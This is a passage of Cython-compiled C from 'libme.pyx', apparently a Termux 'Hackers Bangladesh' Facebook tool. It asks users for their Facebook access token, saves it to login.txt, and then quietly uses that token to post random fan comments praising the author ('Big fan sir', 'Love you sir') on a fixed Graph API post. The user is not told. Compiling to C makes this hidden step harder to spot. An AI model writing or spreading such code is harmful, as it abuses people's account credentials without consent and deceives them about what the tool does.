          __Pyx_DECREF_SET(__pyx_t_8, function);
        }
      }
      __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_3, __pyx_v_token) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_v_token);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 334, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      /* "libme.pyx":335
 * 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 * 			open("login.txt", "w").write(token)
 * 			print (" \n  [] successful login token")             # <<<<<<<<<<<<<<
 * 			self.__bot__follow__()
 * 		except KeyError:
 */
      if (__Pyx_PrintOne(0, __pyx_kp_s_successful_login_token) < 0) __PYX_ERR(0, 335, __pyx_L3_error)

      /* "libme.pyx":336
 * 			open("login.txt", "w").write(token)
 * 			print (" \n  [] successful login token")
 * 			self.__bot__follow__()             # <<<<<<<<<<<<<<
 * 		except KeyError:
 * 			print("  [!]  Token Invalid")
 */
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_bot__follow); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 336, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_3 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
        __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_8);
        if (likely(__pyx_t_3)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
          __Pyx_INCREF(__pyx_t_3);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_8, function);
        }
      }
      __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 336, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      /* "libme.pyx":332
 * 		print
 * 		token = input('\n   \033[0;97m[+] Your Token : ')
 * 		try:             # <<<<<<<<<<<<<<
 * 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 * 			open("login.txt", "w").write(token)
 */
    }
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "libme.pyx":337
 * 			print (" \n  [] successful login token")
 * 			self.__bot__follow__()
 * 		except KeyError:             # <<<<<<<<<<<<<<
 * 			print("  [!]  Token Invalid")
 * 			self.login()
 */
    __pyx_t_10 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError);
    if (__pyx_t_10) {
      __Pyx_AddTraceback("libme.James.__login__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_8, &__pyx_t_3) < 0) __PYX_ERR(0, 337, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_GOTREF(__pyx_t_3);

      /* "libme.pyx":338
 * 			self.__bot__follow__()
 * 		except KeyError:
 * 			print("  [!]  Token Invalid")             # <<<<<<<<<<<<<<
 * 			self.login()
 * 	def __bot__follow__(self):
 */
      if (__Pyx_PrintOne(0, __pyx_kp_s_Token_Invalid) < 0) __PYX_ERR(0, 338, __pyx_L5_except_error)

      /* "libme.pyx":339
 * 		except KeyError:
 * 			print("  [!]  Token Invalid")
 * 			self.login()             # <<<<<<<<<<<<<<
 * 	def __bot__follow__(self):
 * 		try:
 */
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_login_2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 339, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_9 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
        }
      }
      __pyx_t_2 = (__pyx_t_9) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_9) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 339, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    /* "libme.pyx":332
 * 		print
 * 		token = input('\n   \033[0;97m[+] Your Token : ')
 * 		try:             # <<<<<<<<<<<<<<
 * 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 * 			open("login.txt", "w").write(token)
 */
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_ExceptionReset(__pyx_t_4, __pyx_t_5, __pyx_t_6);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_ExceptionReset(__pyx_t_4, __pyx_t_5, __pyx_t_6);
    __pyx_L8_try_end:;
  }

  /* "libme.pyx":327
 * 				continue
 * 		self.loop +=1
 * 	def __login__(self):             # <<<<<<<<<<<<<<
 * 		os.system('clear')
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_AddTraceback("libme.James.__login__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_token);
  __Pyx_XDECREF(__pyx_v_nama);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":340
 * 			print("  [!]  Token Invalid")
 * 			self.login()
 * 	def __bot__follow__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token=open("login.txt","r").read()
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_21__bot__follow__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_21__bot__follow__ = {"__bot__follow__", (PyCFunction)__pyx_pw_5libme_5James_21__bot__follow__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_21__bot__follow__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__bot__follow__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_20__bot__follow__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_20__bot__follow__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_v_token = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_nama = NULL;
  PyObject *__pyx_v_comment = NULL;
  PyObject *__pyx_v_love = NULL;
  PyObject *__pyx_v_james = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  int __pyx_t_10;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__bot__follow__", 0);

  /* "libme.pyx":341
 * 			self.login()
 * 	def __bot__follow__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			token=open("login.txt","r").read()
 * 			nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "libme.pyx":342
 * 	def __bot__follow__(self):
 * 		try:
 * 			token=open("login.txt","r").read()             # <<<<<<<<<<<<<<
 * 			nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
 * 		except IOError:
 */
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__27, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 342, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_read); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 342, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 342, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_token = __pyx_t_4;
      __pyx_t_4 = 0;

      /* "libme.pyx":343
 * 		try:
 * 			token=open("login.txt","r").read()
 * 			nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()             # <<<<<<<<<<<<<<
 * 		except IOError:
 * 			os.system("rm -f login.txt")
 */
      __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_requests); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 343, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_get); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 343, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = PyNumber_Add(__pyx_kp_s_https_graph_facebook_com_me_acce_2, __pyx_v_token); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 343, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_9 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_8);
        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_8, function);
        }
      }
      __pyx_t_5 = (__pyx_t_9) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_9, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_7);
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 343, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_json); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 343, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_8);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_8, function);
        }
      }
      __pyx_t_6 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 343, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Dict_GetItem(__pyx_t_6, __pyx_n_s_name); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 343, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_lower); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 343, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_8)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_8);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 343, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_nama = __pyx_t_4;
      __pyx_t_4 = 0;

      /* "libme.pyx":341
 * 			self.login()
 * 	def __bot__follow__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			token=open("login.txt","r").read()
 * 			nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "libme.pyx":344
 * 			token=open("login.txt","r").read()
 * 			nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
 * 		except IOError:             # <<<<<<<<<<<<<<
 * 			os.system("rm -f login.txt")
 * 			print(" [!] expired tokens")
 */
    __pyx_t_10 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
    if (__pyx_t_10) {
      __Pyx_AddTraceback("libme.James.__bot__follow__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_6, &__pyx_t_8) < 0) __PYX_ERR(0, 344, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_8);

      /* "libme.pyx":345
 * 			nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
 * 		except IOError:
 * 			os.system("rm -f login.txt")             # <<<<<<<<<<<<<<
 * 			print(" [!] expired tokens")
 * 			self.__login__()
 */
      __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_os); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 345, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 345, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_9);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_9, function);
        }
      }
      __pyx_t_5 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_9, __pyx_t_7, __pyx_kp_s_rm_f_login_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_kp_s_rm_f_login_txt);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 345, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

      /* "libme.pyx":346
 * 		except IOError:
 * 			os.system("rm -f login.txt")
 * 			print(" [!] expired tokens")             # <<<<<<<<<<<<<<
 * 			self.__login__()
 * 		comment = random.choice(['Big fan sir','Big fan brother','sir big fan','Sir please reply me','Love you sir','Sir big fan please reply me','Sir your my favorite Developer'])
 */
      if (__Pyx_PrintOne(0, __pyx_kp_s_expired_tokens) < 0) __PYX_ERR(0, 346, __pyx_L5_except_error)

      /* "libme.pyx":347
 * 			os.system("rm -f login.txt")
 * 			print(" [!] expired tokens")
 * 			self.__login__()             # <<<<<<<<<<<<<<
 * 		comment = random.choice(['Big fan sir','Big fan brother','sir big fan','Sir please reply me','Love you sir','Sir big fan please reply me','Sir your my favorite Developer'])
 * 		love = random.choice(['Star','Love it','James Boss','James Bro','Wow sir','Super Star',''])
 */
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_login); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 347, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_9);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_9, function);
        }
      }
      __pyx_t_5 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_9);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 347, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    /* "libme.pyx":341
 * 			self.login()
 * 	def __bot__follow__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			token=open("login.txt","r").read()
 * 			nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
 */
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  /* "libme.pyx":348
 * 			print(" [!] expired tokens")
 * 			self.__login__()
 * 		comment = random.choice(['Big fan sir','Big fan brother','sir big fan','Sir please reply me','Love you sir','Sir big fan please reply me','Sir your my favorite Developer'])             # <<<<<<<<<<<<<<
 * 		love = random.choice(['Star','Love it','James Boss','James Bro','Wow sir','Super Star',''])
 * 		james = ''+love
 */
  __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_random); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = PyList_New(7); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_INCREF(__pyx_kp_s_Big_fan_sir);
  __Pyx_GIVEREF(__pyx_kp_s_Big_fan_sir);
  PyList_SET_ITEM(__pyx_t_6, 0, __pyx_kp_s_Big_fan_sir);
  __Pyx_INCREF(__pyx_kp_s_Big_fan_brother);
  __Pyx_GIVEREF(__pyx_kp_s_Big_fan_brother);
  PyList_SET_ITEM(__pyx_t_6, 1, __pyx_kp_s_Big_fan_brother);
  __Pyx_INCREF(__pyx_kp_s_sir_big_fan);
  __Pyx_GIVEREF(__pyx_kp_s_sir_big_fan);
  PyList_SET_ITEM(__pyx_t_6, 2, __pyx_kp_s_sir_big_fan);
  __Pyx_INCREF(__pyx_kp_s_Sir_please_reply_me);
  __Pyx_GIVEREF(__pyx_kp_s_Sir_please_reply_me);
  PyList_SET_ITEM(__pyx_t_6, 3, __pyx_kp_s_Sir_please_reply_me);
  __Pyx_INCREF(__pyx_kp_s_Love_you_sir);
  __Pyx_GIVEREF(__pyx_kp_s_Love_you_sir);
  PyList_SET_ITEM(__pyx_t_6, 4, __pyx_kp_s_Love_you_sir);
  __Pyx_INCREF(__pyx_kp_s_Sir_big_fan_please_reply_me);
  __Pyx_GIVEREF(__pyx_kp_s_Sir_big_fan_please_reply_me);
  PyList_SET_ITEM(__pyx_t_6, 5, __pyx_kp_s_Sir_big_fan_please_reply_me);
  __Pyx_INCREF(__pyx_kp_s_Sir_your_my_favorite_Developer);
  __Pyx_GIVEREF(__pyx_kp_s_Sir_your_my_favorite_Developer);
  PyList_SET_ITEM(__pyx_t_6, 6, __pyx_kp_s_Sir_your_my_favorite_Developer);
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_8 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_5, __pyx_t_6) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_6);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_v_comment = __pyx_t_8;
  __pyx_t_8 = 0;

  /* "libme.pyx":349
 * 			self.__login__()
 * 		comment = random.choice(['Big fan sir','Big fan brother','sir big fan','Sir please reply me','Love you sir','Sir big fan please reply me','Sir your my favorite Developer'])
 * 		love = random.choice(['Star','Love it','James Boss','James Bro','Wow sir','Super Star',''])             # <<<<<<<<<<<<<<
 * 		james = ''+love
 * 		requests.post('https://graph.facebook.com/3048075795436340/comments/?message=' +james+ '&access_token=' + token)
 */
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_choice); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = PyList_New(7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_INCREF(__pyx_kp_s_Star);
  __Pyx_GIVEREF(__pyx_kp_s_Star);
  PyList_SET_ITEM(__pyx_t_4, 0, __pyx_kp_s_Star);
  __Pyx_INCREF(__pyx_kp_s_Love_it);
  __Pyx_GIVEREF(__pyx_kp_s_Love_it);
  PyList_SET_ITEM(__pyx_t_4, 1, __pyx_kp_s_Love_it);
  __Pyx_INCREF(__pyx_kp_s_James_Boss);
